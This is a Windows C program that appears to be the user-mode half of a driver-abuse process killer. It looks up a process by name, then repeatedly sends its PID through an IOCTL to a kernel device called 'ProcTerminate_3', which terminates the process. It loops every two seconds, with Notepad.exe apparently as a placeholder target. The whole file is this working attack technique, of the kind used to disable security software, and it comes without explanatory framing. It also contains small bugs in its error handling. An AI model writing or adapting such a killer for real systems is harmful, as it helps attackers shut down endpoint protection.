#include <Windows.h>
#include <stdio.h>
#include "defines.h"

#define IOCTL_TERM_3 CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _PROC_TERM {
	ULONG Pid;
} PROC_TERM, * PPROC_TERM;


DWORD findProc(LPCWSTR processName) {

	DWORD pid = 0;

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (!hNtdll) {
		wprintf(L"[-] Failed to get handle to ntdll.dll\n");
		return 0;
	}

	fnNtQuerySystemInformation NtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		wprintf(L"[-] Failed to get address of NtQuerySystemInformation\n");
		return 0;
	}

	NTSTATUS status;
	ULONG returnLength = 0;
	status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &returnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH) {
		wprintf(L"[-] NtQuerySystemInformation failed to get required buffer size\n");
		return 0;
	}

	PVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength);
	if (!buffer) {
		wprintf(L"[-] Failed to allocate memory for process information\n");
		return 0;
	}

	status = NtQuerySystemInformation(SystemProcessInformation, buffer, returnLength, &returnLength);

	if (!NT_SUCCESS(status)) {
		wprintf(L"[-] NtQuerySystemInformation failed\n");
		HeapFree(GetProcessHeap(), 0, buffer);
		return 0;
	}

	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		if (pInfo->ImageName.Buffer && _wcsicmp(pInfo->ImageName.Buffer, processName) == 0) {
			pid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
			break;
		}

		if (pInfo->NextEntryOffset == 0) {
			break;
		}

		pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);

	}

	HeapFree(GetProcessHeap(), 0, buffer);
	return pid;
}

BOOL Kill(PCWSTR ProcName) {

	DWORD pid = findProc(ProcName);

	DWORD bytesReturned;
	PROC_TERM ProcTerm;
	ProcTerm.Pid = pid;

	if (pid == 0) {
		wprintf(L"[-] Process %ls not found.\n", ProcName);
		return FALSE;
	}

	HANDLE hDevice = CreateFileW(
		L"\\\\.\\ProcTerminate_3",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Failed to open device: %d\n", GetLastError());
		return 1;
	}

	BOOL success = DeviceIoControl(
		hDevice,
		IOCTL_TERM_3,
		&ProcTerm,
		sizeof(PROC_TERM),
		NULL,
		0,
		&bytesReturned,
		NULL
	);

	if (!success) {
		wprintf(L"[-] DeviceIoControl failed: %d\n", GetLastError());
		CloseHandle(hDevice);
		return FALSE;
	}

	wprintf(L"[+] Process %ls (PID: %lu) killed successfully.\n", ProcName, pid);

	return TRUE;
}

int main(int argc, char* argv[]) {

	PCWSTR process_name;
	const wchar_t* process_names[] = {
		L"Notepad.exe"
	};

	DWORD proc_count = sizeof(process_names) / sizeof(process_names[0]);

	while (TRUE) {
		for (size_t i = 0; i < proc_count; i++) {
			process_name = process_names[i];
			Kill(process_name);
		}
		Sleep(2000);
	}

	return 0;
}